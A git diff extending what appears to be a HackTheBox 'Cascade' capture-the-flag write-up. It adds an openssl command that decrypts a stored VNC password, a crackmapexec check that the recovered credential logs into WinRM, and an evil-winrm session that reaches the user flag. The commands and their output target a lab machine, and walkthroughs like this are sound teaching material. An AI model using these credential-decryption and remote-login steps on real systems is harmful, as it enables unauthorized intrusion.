@@ -251,7 +251,7 @@ The Email Message in `Meeting_Notes_June_2018.html`:
 
 ![Email Message](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Cascade/Images/Email%20Message.png)
 
-The file `'VNC Install.reg'` contains a password:
+The file `'VNC Install.reg'` found under a folder titled `s.smith` contains a password:
 
 ```bash
 cat 'VNC Install.reg'
@@ -269,6 +269,9 @@ The file `ArkAdRecycleBin.log` contains keyword `TempAdmin`:
 8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
 ```
 
+
+## VNC Password Decrypt 
+
 Searching online provides a [method](https://github.com/frizb/PasswordDecrypts) to decrypt the VNC password:
 
 ```bash
@@ -276,6 +279,33 @@ echo -n "6bcf2a4b6e5aca0f"| xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K
 
 00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
 00000008
+```
+
+Running `crackmapexec` shows the user `s.smith` can authenticate via WinRM:
+
+```bash
+crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
+
+SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
+HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
+WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
+```
+
+Used `evil-winrm` to authenticate and get user flag:
+
+```bash
+evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
+
+*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir
+
+
+    Directory: C:\Users\s.smith\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        6/15/2024   1:04 PM             34 user.txt
+-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
 ```
 
 
